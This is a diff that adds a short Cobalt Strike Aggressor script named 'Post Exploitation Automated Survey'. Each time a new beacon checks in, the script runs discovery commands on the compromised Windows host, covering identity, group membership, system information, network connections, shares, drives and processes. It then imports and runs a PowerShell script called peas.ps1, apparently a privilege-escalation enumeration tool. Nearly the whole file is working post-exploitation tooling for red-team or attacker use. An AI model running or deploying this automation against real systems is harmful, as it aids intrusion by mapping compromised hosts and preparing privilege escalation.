@@ -1,0 +1,36 @@
+# 
+# Post Exploitation Automated Survey
+# Twitter: @BarrettJ
+# 
+
+on beacon_initial {
+
+#  prompt_confirm( "New beacon coming in - run survey?", "Run Survey?" {
+    # Printing out who we are
+    println(bgetuid($1));
+    # Listing groups
+    bshell( $1, "whoami /groups");
+    # Getting system info
+    bshell( $1, "systeminfo"  );
+    # Listing network connections
+    bshell($1, "netstat -an | findstr /i estab" );
+    # Listing all drives on the system
+    println(bdrives($1));
+    # View active network shares
+    bshell( $1, "net use" );
+    # Print current directory
+    println(bpwd($1));
+    # Print process listing
+    println(bps($1));
+
+# Run our actual PEAS PowerShell script
+    bpowershell_import($1, "peas.ps1");
+    bpowershell($1, "Invoke-PEAS");
+  # Do a directory list on the given folder
+  #  println(bls($1,"folder"));
+
+    # Listing beacon metadata - for some reason this doesn't work and dumps it into the script console
+#    println("User is: " . beacon_info($1,"user"));
+#    println("User is: " . binfo($1,"user"));
+#  });
+}
